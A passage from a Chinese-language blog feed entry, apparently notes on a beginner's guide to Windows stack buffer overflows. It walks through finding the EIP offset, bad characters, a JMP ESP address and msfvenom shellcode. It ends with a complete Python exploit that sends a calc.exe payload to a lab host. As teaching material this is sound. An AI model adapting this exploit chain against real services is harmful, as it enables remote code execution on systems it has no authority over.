socketbuffer=b&quot;&lt;msf-pattern_create生成的buffer&gt;&quot;buffer+=b&quot;\n&quot;ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)s.sendall(buffer)</code></pre><p>该漏洞导致访问冲突错误，程序崩溃。现在，ESP寄存器显示了我们发送给应用程序使其崩溃的模式。现在，如果我们查看EIP寄存器，则值为39654138<br><img src="https://z3.ax1x.com/2021/05/07/g3vPwn.md.png" alt=""></p><p>msf-pattern_offset计算出EIP偏移大小</p><pre><code>msf-pattern_offset -l 200 -q 39654138</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3vioq.png" alt=""></p><p>现在我们知道EIP偏移值，我们不再需要发送模式。我们可以简单地发送146个A代替该模式。我们将在146 A之后发送4 B，以确保我们可以控制EIP。如果漏洞利用代码执行后EIP寄存器中有4个B，那么可以确认我们现在可以控制EIP了。<br><img src="https://z3.ax1x.com/2021/05/07/g3vZSU.png" alt=""></p><pre><code>import socketoffset=146eip=b&quot;B&quot; * 4buffer=b&quot;A&quot;*offset+eip #&quot;A&quot;*offset为填充缓冲区，+eip是溢出来的4个字节buffer+=b&quot;\n&quot;ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)s.sendall(buffer)</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3velF.png" alt=""><br>如上图所示，EIP寄存器为“ 42424242”。ASCII字符“ B”的十六进制值为0x42。因此，在这一点上已确认我们可以控制EIP寄存器。</p><p><strong>寻找坏字节 </strong><br>坏字符是破坏shellcode的不需要的字符。查找和忽略不良字符是必要的，因为不良字符会在出现的任何地方终止字符串执行。如果最后在我们的shellcode中存在任何坏字符，那么它将在该坏字符所在的位置停止执行，因此在生成我们的shellcode时，我们将忽略所有坏字符。</p><p>要查找不良字符，我们首先将使用python脚本生成所有字符，然后将其发送到应用程序以进行崩溃和分析。下面的代码生成从x01到xff的所有字符，而没有x00，因为x00在默认情况下是错误字符。x00被称为空字节。</p><pre><code>for x in range(1,256):    print(&quot;\\x&quot;+&quot;{:02x}&quot;.format(x),end=&quot;&quot;)print(&quot;&quot;)</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3vQT1.png" alt=""></p><p>修改脚本发送:</p><pre><code class="python">import socketoffset=146eip=b&quot;B&quot; * 4buf=b&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;buffer=b&quot;A&quot;*offset+eip+bufbuffer+=b&quot;\n&quot;ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)s.sendall(buffer)</code></pre><p>将对ESP的十六进制转储与所有字符进行比较，以查找内存中出现的任何不良字符。为此，我们将选择ESP，然后在转储中选择“跟随”。<br>（字符损坏的十六进制会变成00）</p><p><img src="https://z3.ax1x.com/2021/05/07/g3v8fK.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/07/g3vNOH.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/07/g3vd0A.png" alt=""></p><p>将十六进制转储与发送的所有字符进行比较，我们将看到从01到09一切都很好，但是09之后是21，而不是0A。这意味着”\x0a”是错误字符。<br>检查从01到FF的ESP十六进制转储，可以在上图中看到，我们现在推导出了所有不良字符，这意味着“ \ x00”和“ \ x0a”是唯一出现的不良字符。</p><h2 id="JMP-ESP"><a href="#JMP-ESP" class="headerlink" title="JMP ESP"></a>JMP ESP</h2><p>(寻找调用jmp ESP的地址，可以修改EIP为对应的jmp ESP地址这里可以这么做，原因是这里并没开启ASLR，开启了ASLR需要另外操作)<br>为了找到JMP ESP，我们将使用mona模块。我们需要下载mona.py并将其粘贴到C:\Program Files（x86\Immunity Inc\Immunity Debugger\PyCommands中。<br>发生访问冲突时，ESP寄存器指向包含我们已发送给应用程序的数据的内存。JMP ESP指令用于将代码执行重定向到该位置。要找到JMP ESP，我们需要使用带有–cpb选项的mona模块以及我们之前发现的所有不良字符，这将避免mona返回具有不良字符的内存指针。运行命令后，我们需要打开日志数据。</p><pre><code>!mona jmp -r esp -cpb &quot;\x00\x0a&quot;</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3v61S.png" alt=""></p><p>寻找第一个jmp ESP的地址，复制内存地址<br><img src="https://z3.ax1x.com/2021/05/07/g3vf7n.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/07/g3vIhV.png" alt=""></p><p>如上图所示，我们发现JMP ESP地址为080414C3。在更新脚本之前，我们需要了解字节序的概念。</p><p><strong>字节序</strong><br>计算机有两种存储int和float之类的多字节数据类型的方式，这两种类型称为Little Endian和Big Endian。x86被称为Little Endian体系结构。在这种体系结构中，二进制文件的最后一个字节首先存储。在Big Endian中，情况恰恰相反。二进制文件的第一个字节仅在Big Endian体系结构中首先存储。当我们使用x86体系结构时，应将JMP ESP地址转换为Little Endian格式，即”\xC3\x14\x04\x08”。在使用JMP ESP之后，我们需要对漏洞利用进行一些调整。</p><p>（其实就是大端和小端序列的区别，小端序列内存取反，大端序列内存不变）</p><p><strong>NOP指令</strong><br>NOP是一系列无操作指令，负责将CPU的执行流程滑至下一个内存地址。如果我们在shellcode之前加了nop，那么缓冲区的位置就无关紧要，当返回指针碰到NOP滑板时，顾名思义，它将滑动返回地址，直到到达我们的shellcode的开头。 。<br><img src="https://z3.ax1x.com/2021/05/07/g3v71U.png" alt=""></p><p>不同的CPU的NOP值是不同的。在我们的例子中，我们将使用”\x90”。<br>nop指令对应的字节码是90<br><img src="https://z3.ax1x.com/2021/05/07/g3vX7R.png" alt=""></p><h2 id="生成Shellcode"><a href="#生成Shellcode" class="headerlink" title="生成Shellcode"></a>生成Shellcode</h2><pre><code>msfvenom -p windows/exec cmd=calc.exe -b &quot;\x00\x0a&quot; -f py</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3vxtx.png" alt=""></p><p>shellcode发送</p><pre><code class="python">import socketoffset=146buf =  b&quot;&quot;buf += b&quot;\xbd\xb9\xb7\x52\x9e\xdb\xd6\xd9\x74\x24\xf4\x58\x33&quot;buf += b&quot;\xc9\xb1\x31\x31\x68\x13\x03\x68\x13\x83\xe8\x45\x55&quot;buf += b&quot;\xa7\x62\x5d\x18\x48\x9b\x9d\x7d\xc0\x7e\xac\xbd\xb6&quot;buf += b&quot;\x0b\x9e\x0d\xbc\x5e\x12\xe5\x90\x4a\xa1\x8b\x3c\x7c&quot;buf += b&quot;\x02\x21\x1b\xb3\x93\x1a\x5f\xd2\x17\x61\x8c\x34\x26&quot;buf += b&quot;\xaa\xc1\x35\x6f\xd7\x28\x67\x38\x93\x9f\x98\x4d\xe9&quot;buf += b&quot;\x23\x12\x1d\xff\x23\xc7\xd5\xfe\x02\x56\x6e\x59\x85&quot;buf += b&quot;\x58\xa3\xd1\x8c\x42\xa0\xdc\x47\xf8\x12\xaa\x59\x28&quot;buf += b&quot;\x6b\x53\xf5\x15\x44\xa6\x07\x51\x62\x59\x72\xab\x91&quot;buf += b&quot;\xe4\x85\x68\xe8\x32\x03\x6b\x4a\xb0\xb3\x57\x6b\x15&quot;buf += b&quot;\x25\x13\x67\xd2\x21\x7b\x6b\xe5\xe6\xf7\x97\x6e\x09&quot;buf += b&quot;\xd8\x1e\x34\x2e\xfc\x7b\xee\x4f\xa5\x21\x41\x6f\xb5&quot;buf += b&quot;\x8a\x3e\xd5\xbd\x26\x2a\x64\x9c\x2c\xad\xfa\x9a\x02&quot;buf += b&quot;\xad\x04\xa5\x32\xc6\x35\x2e\xdd\x91\xc9\xe5\x9a\x6e&quot;buf += b&quot;\x80\xa4\x8a\xe6\x4d\x3d\x8f\x6a\x6e\xeb\xd3\x92\xed&quot;buf += b&quot;\x1e\xab\x60\xed\x6a\xae\x2d\xa9\x87\xc2\x3e\x5c\xa8&quot;buf += b&quot;\x71\x3e\x75\xcb\x14\xac\x15\x22\xb3\x54\xbf\x3a&quot;jmpaddrfess=b&quot;\xc3\x14\x04\x08&quot;nops = b&quot;\x90&quot; * 16buffer=b&quot;A&quot;*offset+jmpaddrfess+nops+buf #填充缓冲区-&gt;jmp到执行ESP的指令（EIP寄存器控制）-&gt; nop指令填充-&gt;shellcode执行buffer+=b&quot;\n&quot;ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)s.sendall(buffer)</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3xPje.png" alt=""></p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h2><p>1.Fuzz造成崩溃的bytes，找到崩溃的寄存器<br>2.崩溃中断后给出的地址复制，计算ESP填充大小<br>3.尝试控制EIP<br>4.寻找错误十六进制坏字节<br>5.shellcode发送执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;原文链接:&lt;a href=&quot;https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.hackingart</summary>
      
    
    
    
    
    <category term="windows" scheme="http://422926799.github.io/tags/windows/"/>
    
  </entry>
  
</feed>
